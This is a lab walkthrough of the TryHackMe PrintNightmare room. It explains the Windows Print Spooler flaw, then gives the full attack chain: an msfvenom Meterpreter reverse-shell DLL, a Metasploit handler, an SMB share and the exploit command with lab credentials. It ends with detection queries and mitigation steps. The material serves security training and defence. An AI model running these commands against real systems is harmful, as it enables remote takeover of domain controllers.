# PrintNightmare

**Room Link:** [https://tryhackme.com/r/room/printnightmarehpzqlp8](https://tryhackme.com/r/room/printnightmarehpzqlp8)

## Windows Print Spooler Service

Microsoft defines the [Print spooler service](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) as a service that runs on each computer system. As you can guess from the name, the Print spooler service manages the printing processes. The Print spooler's responsibilities are managing the print jobs, receiving files to be printed, queueing them, and scheduling.

You are able to Start/Stop/Pause/Resume the Print Spooler Service by simply navigating to Services on your Windows system.&#x20;

Services:

\


<figure><img src="https://i.ibb.co/RT53ySK/spooleerr.png" alt=""><figcaption></figcaption></figure>

Print Spooler Properties (Services):\


\


<figure><img src="https://i.ibb.co/3WPvSJY/print.png" alt=""><figcaption></figcaption></figure>

Print spooler service makes sure to provide enough resources to the computers that send out the print jobs. Remember the early days when users had to wait for print jobs to finish to perform other operations? Well, the Print spooler service took care of this issue for us.&#x20;

The Print spooler service allows the systems to act as print clients, administrative clients, or print servers. It is also important to note that the Print spooler service is enabled by default in all Windows clients and servers. It's necessary to have a Print spooler service on the computer to connect to a printer. There are third-party software and drivers provided by the printer manufacturers that would not require you to have the Print spooler service enabled. Still, most companies prefer to utilize Print spooler services.&#x20;

Domain Controllers mainly use Print spooler service for printer pruning (the process of removing the printers that are not in use anymore on the network and have been added as objects to Active Directory). Printer pruning eliminates the issue for the users reaching out to a non-existent printer.  You will know soon why we mentioned Domain Controllers.&#x20;

## Remote Code Execution Vulnerability

To better understand the PrintNightmare vulnerability (or any vulnerability), you should get into the habit of researching the vulnerabilities by reading Microsoft articles on any Windows-specific CVE or browsing through the Internet for community and vendor blogposts.

There has been some confusion if the [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) and [CVE-2021-34527 ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)are related to each other. They go under the same name: Windows Print Spooler Remote Code Execution Vulnerability and are both related to the Print Spooler.&#x20;

As [Microsoft ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)states in the FAQ, the PrintNightmare (CVE-2021-34527) vulnerability "_is similar but distinct from the vulnerability that is assigned CVE-2021-1675._ _The attack vector is different as well."_

What did Microsoft mean by the attack vector? To answer this question, let's look into the differences between the two vulnerabilities and append the timeline of events.&#x20;

Per [Microsoft's ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)definition, PrintNightmare vulnerability is _"a remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights."._

Running arbitrary code involves executing any commands of the attacker's choice and preference on a victim's machine.\
Suppose you had a chance to look at both CVE's on Microsoft. You would notice that the attack vectors for both are different.&#x20;

To exploit the CVE-2021-1675 vulnerability, the attacker would need to have direct or local access to the machine to use a malicious DLL file to escalate privileges. To exploit the CVE-2021-34527 vulnerability successfully, the attacker can remotely inject the malicious DLL file.&#x20;

Vulnerability metrics for CVE-2021-1675:

\


<figure><img src="https://i.ibb.co/fd1m86s/spooleerr1.png" alt=""><figcaption></figcaption></figure>

Vulnerability metrics for CVE-2021-34527:

<figure><img src="https://i.ibb.co/tKZMCXB/34527.png" alt=""><figcaption></figcaption></figure>

Timeline:\


June 8, 2021: Microsoft issued a patch for a privilege escalation vulnerability in the print spooler service (CVE-2021-1675).

June 21, 2021: Microsoft revised the vulnerability and changed its classification to remote code execution (RCE).

June 27, 2021: Chinese cybersecurity firm QiAnXin [published a video](https://twitter.com/RedDrip7/status/1409353110187757575) demonstrating local privilege escalation (LPE) and RCE.

July 2, 2021: Microsoft assigns a new CVE so-called PrintNightmare vulnerability in the print spooler service (CVE-2021-34527).

July 6, 2021: Microsoft released an out-of-band patch (a patch released at some time other than the normal release time) to address CVE-2021-34527 and provides additional workarounds to defend against the exploit.

What makes PrintNightmare dangerous?&#x20;

1. It can be exploited over the network; the attacker doesn't need direct access to the machine.
2. The [proof-of-concept](https://github.com/cube0x0/CVE-2021-1675) was made public on the Internet.
3. The Print Spooler service is enabled by DEFAULT on domain controllers and computers with SYSTEM privileges.

## Try it yourself!

To understand how the attack works and what logs and events are generated, you need to put the Black Hat on and run the attack on your own. But, of course, it requires permission from management to perform this attack in your employer's environment, even if it's an isolated environment.

Fret not, you can perform the attack against the attached virtual machine and not in your employer's environment.&#x20;

***

Follow the steps outlined below to exploit the Domain Controller using the Attack Box by exploiting the PrintNightmare vulnerability.&#x20;

In the sample terminal output below, the victim is `10.10.57.176`, and the attacker is `192.168.0.100`.&#x20;

Note: As a subscriber, launch the Attack Box if you haven't done so before proceeding. As a free user, this task should be completed on your local attacking machine.

Before proceeding, create 2 directories on the Desktop:

* `pn` - this will contain the exploit.
* `share` - this directory (/root/Desktop/share) will contain the malicious DLL that will be created with msfvenom. \
  \


Download CVE-2021-1675.py:

CloneCVE-2021-1675 exploit from GitHub

**Kali**

```shell-session
git clone https://github.com/tryhackme/CVE-2021-1675.git 
```

Before spinning up Metasploit, create the malicious DLL. \


Note: In the terminal outputs below the attacker is `192.168.0.100`.  You will need to replace `192.168.0.100` with your ATTACK BOX IP (or OpenVPN IP).\


You will use msfvenom to create the malicious DLL.&#x20;

Create maliciousDLLwith Msfvenom

**Kali**

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$KALI LPORT=4444 -f dll -o /root/malicious.dll 
```

If you see a similar output when you run this command, then you should have successfully created the DLL.

Let's fire up Metasploit.

**Kali**

```shell-session
msfconsole 
```

Once Metasploit successfully loads, you need to configure the handler to receive the incoming connection from the malicious DLL.&#x20;

Run the following commands options:

* `use exploit/multi/handler`
* `set payload windows/x64/meterpreter/reverse_tcp`
* `set lhost VALUE`&#x20;
* `set lport VALUE`

Note: The value for LHOST and LPORT must be the same values you used to create the malicious DLL.&#x20;

Configure a Metasploitlistener

**Kali(msf)**

```shell-session
use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set lhost $KALI
set lport 4444
```

Next, run it so it will be actively waiting for a connection.&#x20;

Start the listener to accept incoming connections

**Kali(msf)**

```shell-session
run -j 
```

The `-j` simply means to run it as a job.&#x20;

**Kali(msf)**

```shell-session
jobs
```

<figure><img src="../../.gitbook/assets/image (1116).png" alt=""><figcaption></figcaption></figure>

Great, now you'll need to host the malicious DLL in a SMB share running on the attacker box. We'll use the AttackBox in this example.

Below is how to do this with smbserver.py from Impacket.

Start the SMB share with Impacket to host the maliciousDLL

**Kali**

```shell-session
mdir /root/share
smbserver.py share /root/share/ -smb2support 
```

A brief explanation for the command in the above image:

1. This is the name of the SMB share for the exploit execution. (Example: \\\ATTACKER\_IP\share\malicious.dll)
2. This is the local folder that will store the malicious DLL. (Example: /root/Desktop/share/malicious.dll)

Before we blindly just execute an exploit at the target, let's first examine if the target fits the criteria to exploit it.

### Check if the target is vulnerable to this exploit

**Kali**

```shell-session
rpcdump.py @$VICTIM| egrep 'MS-RPRN|MS-PAR' 
```

<figure><img src="../../.gitbook/assets/image (1117).png" alt=""><figcaption></figcaption></figure>

Yep, looks good. It's finally time to run the exploit. Navigate to the location where you downloaded the exploit code from GitHub, which should be `/root/Desktop/pn/CVE-2021-1675`.&#x20;

We will use the Python script to exploit the PrintNightmare vulnerability against the Windows 2019 Domain Controller.

**Kali**

```shell-session
cd /root/CVE-2021-1675/
python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@$VICTIM '\\$KALI\share\malicious.dll'
```

A brief explanation for the command in the above image:

* python3.9 CVE-2021-1675.py -> you're instructing Python to run the following Python script. The values which follow are the parameters the script needs to exploit the PrintNightmare vulnerability successfully.
* Finance-01.THMdepartment.local -> the name of the domain controller (Finance-01) along with the name of the domain (THMdepartment.local)
* sjohnston:mindheartbeauty76@10.10.57.176 -> the username and password for the low privilege Windows user account. \

* \\\ATTACKER\_IP\_ADDRESS\share\malicious.dll -> the location to the SMB path storing the malicious DLL.&#x20;

If all goes well, you should see an output similar to the below image.

**Kali**

```shell-session
cd /root/CVE-2021-1675/
python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@$VICTIM '\\$KALI\share\malicious.dll'
```

You may see Python errors after Try 3... but they are safe to ignore.

```
On the attacker box, you should see the SMB connection calling for the malicious DLL file.
```

Victim connects to the SMB share for the maliciousDLL

```shell-session
root@attackbox:~/Desktop/pn# ...
[*] Incoming connection (10.10.57.176,55037)
[*] AUTHENTICATE_MESSAGE (\,FINANCE-01)
[*] User FINANCE-01\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.210.90,55037)
[*] Remaining connections []
```

<figure><img src="../../.gitbook/assets/image (1118).png" alt=""><figcaption></figcaption></figure>

Lastly, you will have a successful Meterpreter session.&#x20;

<figure><img src="../../.gitbook/assets/image (1119).png" alt=""><figcaption></figcaption></figure>

**Kali(msf)**

```shell-session
sessions
sessions -i 1
shell
```

<figure><img src="../../.gitbook/assets/image (1120).png" alt=""><figcaption></figcaption></figure>

## Indicators of Compromise

Let's imagine the worst-case scenario that the THMdepartment was compromised a couple of days after the PoC for PrintNightmare was released, and you are THMdepartment's Threat Hunter. Your company suspects that an attacker used PrintNightmare to access the Domain Controller, and your task is to find evidence or indicators of compromise. So, the next question would be what indicators should you look for in order to detect the PrintNightmare attack?

The attacker would most likely use rpcdump.py to scan for vulnerable hosts. After finding the vulnerable print server, the attacker can then execute the exploit code (similar to the Python script in the previous task), which will load the malicious DLL file to exploit the vulnerability. More specifically, the exploit code will call the pcAddPrinterDriverEx() function from the authenticated user account and load the malicious DLL file in order to exploit the vulnerability. The pcAddPrinterDriverEx() function is used to install a printer driver on the system.

Sygnia shared some advanced threat hunting tips to detect PrintNightmare. When hunting for PrintNightmare, you should look for the following:

Search for the spoolsv.exe process launching rundll32.exe as a child process without any command-line arguments Considering the usage of the pcAddPrinterDriverEx() function, you will mostly find the malicious DLL dropped into one of these folders %WINDIR%\system32\spool\drivers\x64\3\ folder along with DLLs that were loaded afterward from %WINDIR%\system32\spool\drivers\x64\3\Old\ (You should proactively monitor the folders for any unusual DLLs) Hunt for suspicious spoolsv.exe child processes (cmd.exe, powershell.exe, etc.) The attacker might even use Mimikatz to perform the attack, in this case, a print driver named ‘QMS 810’ will be created. This can be detected by logging the registry changes (e.g., Sysmon ID 13). Search for DLLs that are part of the proof-of-concept codes that were made public, such as MyExploit.dll, evil.dll, addCube.dll, rev.dll, rev2.dll, main64.dll, mimilib.dll. If they're present on the endpoint, you can find them with Event ID 808 in Microsoft-Windows-PrintService. Splunk also did a great job of providing us with some detection search queries:

Identifies Print Spooler adding a new Printer Driver:

```
source="WinEventLog:Microsoft-Windows-PrintService/Operational" EventCode=316 category = "Adding a printer driver" Message = "kernelbase.dll," Message = "UNIDRV.DLL," Message = ".DLL." | stats count min(_time) as firstTime max(_time) as lastTime by OpCode EventCode ComputerName 
```

Message Detects spoolsv.exe with a child process of rundll32.exe:

```
| tstats count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name=spoolsv.exe Processes.process_name=rundll32.exe by Processes.dest Processes.user Processes.parent_process Processes.process_name Processes.process Processes.process_id Processes.parent_process_id 
```

Suspicious rundll32.exe instances without any command-line arguments:

```
| tstats count FROM datamodel=Endpoint.Processes where Processes.process_name=spoolsv.exe by _time Processes.process_id Processes.process_name Processes.dest | rename "Processes." as * | join process_guid _time [| tstats count min(_time) as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Filesystem where Filesystem.file_path="\spool\drivers\x64\" Filesystem.file_name=".dll" by _time Filesystem.dest Filesystem.file_create_time Filesystem.file_name Filesystem.file_path | rename "Filesystem.*" as * | fields _time dest file_create_time file_name file_path process_name process_path process] | dedup file_create_time | table dest file_create_time, file_name, file_path, process_name 
```

Detects when a new printer plug-in has failed to load:

```
source="WinEventLog:Microsoft-Windows-PrintService/Admin" ((ErrorCode="0x45A" (EventCode="808" OR EventCode="4909")) OR ("The print spooler failed to load a plug-in module" OR "\drivers\x64\")) | stats count min(_time) as firstTime max(_time) as lastTime by OpCode EventCode ComputerName Message
```

## Detection: Windows Event Logs

Windows Event Logs are detailed records of security, system, and application notifications created by the Windows operating system. There are some logs that record events related to Print Spooler activity. Still, they might not be enabled by default and need to be configured using Windows Group Policy or Powershell.&#x20;

The logs related to Print Spooler Activity are:\


* _Microsoft-Windows-PrintService/Admin_\

* _Microsoft-Windows-PrintService/Operational_

We can detect the PrintNightmare artifacts by looking at the endpoint events or Windows Event Logs mentioned above.

You can look for the following Event IDs:

* Microsoft-Windows-PrintService/Operational (Event ID 316) - look for _"Printer driver \[file] for Windows x64 Version-3 was added or updated. Files:- UNIDRV.DLL, AddUser.dll, AddUser.dll. No user action is required.”_
* Microsoft-Windows-PrintService/Admin (Event ID 808) - A security event source has attempted to register (can detect unsigned drivers and malicious DLLs loaded by spoolsv.exe)
* Microsoft-Windows-PrintService/Operational (Event ID 811) - Logs the information regarding failed operations. The event will provide information about the full path of the dropped DLL.
* Microsoft-Windows-SMBClient/Security (Event ID 31017) - This Event ID can also be used to detect unsigned drivers loaded by spoolsv.exe.
* Windows System (Event ID 7031) - Service Stop Operations (This event ID will show you unexpected termination of print spooler service).\


You can also use Sysmon to detect PrintNightmare terror: \


* Microsoft-Windows-Sysmon/Operational (Event ID 3) - Network connection (Look for suspicious ports)
* Microsoft-Windows-Sysmon/Operational (Event ID 11) - FileCreate (File creation events are being logged,  you can look for loaded DLLs in the Print Spooler’s driver directory: _C:\Windows\System32\spool\drivers\x64\3_)
* Microsoft-Windows-Sysmon/Operational (Event IDs 23, 26) - FileDelete (You can hunt for deleted malicious DLLs)

You are still in the middle of hunting for THMDepartment to determine if the PrintNightmare attack actually took place.\
Armed with all the knowledge above, can you detect the PrintNightmare artifacts in the Event Logs?&#x20;



<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Add the following filters

**Event Level**

```
Critical, Warning, Verbose Error, Information
```

**Event Logs**

```
Windows Logs/System
Application and Services Logs/Microsoft/Windows/PrintService
Application and Services Logs/Microsoft/Windows/SMBClient
Application and Services Logs/Microsoft/Windows/Sysmon
```

**Event IDs**

```
316,808,811,31017,7031,3,11,23,26
```



**Provide the name of the dropped DLL, including the error code. (no space after the comma)**

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Provide the event log name and the event ID that detected the dropped DLL. (no space after the comma)**

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Find the source name and the event ID when the Print Spooler Service stopped unexpectedly and how many times was this event logged? (format: answer,answer,answer)**

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**After some threat hunting steps, you are more confident now that it's a PrintNightmare attack. Hunt for the attacker's shell connection. Provide the log name, event ID, and destination port. (format: answer,answer,answer)**

**Find...**

```
rundll32
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Oh no! You think you've found the attacker's connection. You need to know the attacker's IP address and the destination hostname in order to terminate the connection.  Provide the attacker's IP address and the hostname. (format: answer,answer)**

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

**A Sysmon FileCreated event was generated and logged. Provide the full path to the dropped DLL and the earliest creation time in UTC. (format:answer,yyyy-mm-dd hh-mm-ss)**

**Find...**

```
spoolsv
```

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

## Detection: Packet Analysis

Packet captures (pcap) play a crucial role in detecting signs of compromise.

If you are not familiar with Wireshark, no worries. You can learn more about Wireshark and how to analyze the packet captures by joining the [Wireshark 101](https://tryhackme.com/room/wireshark) room. It will be a lot of fun!&#x20;

Detecting the PrintNightmare attack, specifically to (CVE-2021-1675 and CVE-2021-34527) by analyzing the network traffic is not as easy as inspecting the artifacts like Windows Event Logs on the victim's machine. The attacker relies on adding a printer driver using [DCE/RPC commands](https://wiki.wireshark.org/DCE/RPC) RpcAddPrinterDriver or RpcAddPrinterDriverEx.

DCE/RPC stands for Distributed Computing Environment/Remote Procedure Calls and is the remote procedure call that establishes APIs and an over-the-network protocol.  But what makes the detection of the attack harder is that there are legitimate uses for RpcAddPrinterDriver or RpcAddPrinterDriverEx commands, so you cannot always rely only on the network traffic analysis to be confident that the PrintNightmare attack occurred in your environment. According to [Corelight](https://corelight.com/blog/why-is-printnightmare-hard-to-detect), it can get even harder to detect, especially if the exploit wraps the DCE/RPC calls in[ SMB3 encryption. ](https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-security)To identify the encrypted DCE/RPC calls, you need to somehow decrypt and decode the payloads, which is a time-consuming task.&#x20;

Corelight also released a [Zeek package ](https://github.com/corelight/CVE-2021-1675)that detects the printer driver additions over DCE/RPC commands that are not encrypted.&#x20;

Attached to this task is a PCAP from a PrintNightmare attack you can download and open in your local Wireshark instance.&#x20;

Task: Inspect the PCAP and answer the questions below.&#x20;

## Detection: Packet Analysis

**What is the host name of the domain controller?**

**Wireshark**

```
smb
```

<figure><img src="../../.gitbook/assets/image (1121).png" alt=""><figcaption></figcaption></figure>

**Wireshark**

```
ip.addr==10.10.114.174 || ip.addr==10.10.124.236 and smb
```

<figure><img src="../../.gitbook/assets/image (1122).png" alt=""><figcaption></figcaption></figure>

**What is the local domain?**

**Wireshark**

```
ip.addr==10.10.114.174 || ip.addr==10.10.124.236 and smb2
```

<figure><img src="../../.gitbook/assets/image (1123).png" alt=""><figcaption></figcaption></figure>

**What user account was utilized to exploit the vulnerability?**

<figure><img src="../../.gitbook/assets/image (1124).png" alt=""><figcaption></figcaption></figure>

**What was the malicious DLL used in the exploit?**

<figure><img src="../../.gitbook/assets/image (1125).png" alt=""><figcaption></figcaption></figure>

**What was the attacker's IP address?**

<figure><img src="../../.gitbook/assets/image (1126).png" alt=""><figcaption></figcaption></figure>



**What was the UNC path where the malicious DLL was hosted?**

<figure><img src="../../.gitbook/assets/image (1127).png" alt=""><figcaption></figcaption></figure>

**There are encrypted packets in the results. What was the associated protocol?**

<figure><img src="../../.gitbook/assets/image (1128).png" alt=""><figcaption></figcaption></figure>

## Mitigation: Disable Print Spooler

It was not just a nightmare, and now you are 100% confident that it was a PrintNightmare attack on THMDepartment. You checked the other domain controllers on your network, and it appears that they are clean.

It is not the end of the world just yet. You can still mitigate or defend against the attack by disabling the Print Spooler on all domain controllers and modify the registry settings (if applicable). How can you do it?

[Microsoft ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)provided the steps to detect if Print Spooler service is enabled and how to disable them:

First, you need to determine if the Print Spooler service is running.

Run the following in Windows PowerShell (Run as administrator):\


`Get-Service -Name Spooler`

If Print Spooler is running or if the service is not set to disabled, then select one of the options below to either disable the Print Spooler service or to Disable inbound remote printing through Group Policy.

Option 1)  Disable the Print Spooler service:\


If disabling the Print Spooler service is appropriate for your environment, use the following PowerShell commands:

`Stop-Service -Name Spooler -Force`

`Set-Service -Name Spooler -StartupType Disabled`

NOTE: By disabling the Print Spooler service, you remove the ability to print locally and remotely.

Option 2)  Disable inbound remote printing through Group Policy:\


The settings via Group Policy can be configured as follows:\


`Computer Configuration / Administrative Templates / Printers`\


Disable the _“Allow Print Spooler to accept client connections”_ policy to block remote attacks.

This policy will block the remote attack vector by preventing inbound remote printing operations. The system will no longer operate as a print server, but local printing to a directly attached device will still work.

Note: Remember that for the group policy to take effect across the domain, or even the local machine, you need to issue a `gpupdate /force` command.\


For more information, see: [Use Group Policy settings to control printers.](https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad-printer)\


The[ security update ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)for Windows Server 2012, Windows Server 2016, and Windows 10, Version 1607 have been released by Microsoft on July 7, 2021.&#x20;

Additional steps for mitigation besides installing the updates recommended by Microsoft:

You must confirm that the following registry settings are set to 0 (zero) or are not defined (Note: The mentioned below registry keys do not exist by default, and therefore are already at the secure setting.), also check that your Group Policy settings are correct (see [FAQ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)):

`HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint`

NoWarningNoElevationOnInstall = 0 (DWORD) or not defined (default setting)

UpdatePromptSettings = 0 (DWORD) or not defined (default setting)

Note: Having NoWarningNoElevationOnInstall set to 1 makes your system vulnerable by design.

















**Wireshark**

```
smb
```



**Wireshark**

```
smb
```



